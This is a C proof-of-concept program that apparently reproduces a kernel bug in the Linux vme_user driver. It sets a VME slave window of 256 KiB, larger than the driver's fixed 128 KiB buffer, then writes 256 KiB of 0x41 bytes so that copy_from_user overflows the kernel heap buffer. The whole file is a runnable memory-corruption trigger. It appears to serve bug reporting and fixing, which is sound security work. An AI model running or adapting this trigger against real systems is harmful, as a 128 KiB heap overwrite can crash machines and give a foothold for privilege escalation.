// PoC trigger for the vme_user SLAVE-path OOB (buffer_from_user).
// Sets a VME slave window LARGER than the fixed PCI_BUF_SIZE (128 KiB)
// kern_buf, then write()s that many bytes -> copy_from_user past the
// buffer -> KASAN slab-out-of-bounds (vme_fake backs kern_buf with kmalloc).
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/ioctl.h>

struct vme_slave {
	uint32_t enable;
	uint64_t vme_addr;
	uint64_t size;
	uint32_t aspace;
	uint32_t cycle;
} __attribute__((packed));

#define VME_IOC_MAGIC 0xAE
#define VME_SET_SLAVE _IOW(VME_IOC_MAGIC, 2, struct vme_slave)
#define VME_A32 0x4
#define VME_SCT 0x1
#define PCI_BUF_SIZE 0x20000 // 128 KiB fixed kern_buf
#define WIN 0x40000          // 256 KiB window > buffer

int main(void)
{
	int fd = open("/dev/bus/vme/s0", O_RDWR);
	if(fd < 0) {
		perror("open /dev/bus/vme/s0");
		return 1;
	}
	struct vme_slave s;
	memset(&s, 0, sizeof(s));
	s.enable = 1;
	s.vme_addr = 0;
	s.size = WIN;
	s.aspace = VME_A32;
	s.cycle = VME_SCT;
	if(ioctl(fd, VME_SET_SLAVE, &s) < 0) {
		perror("VME_SET_SLAVE");
		return 2;
	}
	printf("[trigger] slave window size=0x%x, kern_buf=0x%x\n", WIN,
	       PCI_BUF_SIZE);
	static char buf[WIN];
	memset(buf, 0x41, sizeof(buf));
	// write WIN bytes from ppos 0: buffer_from_user does
	// copy_from_user(kern_buf, buf, WIN) -> 128 KiB OOB write.
	ssize_t n = write(fd, buf, WIN);
	printf("[trigger] write returned %zd\n", n);
	close(fd);
	return 0;
}
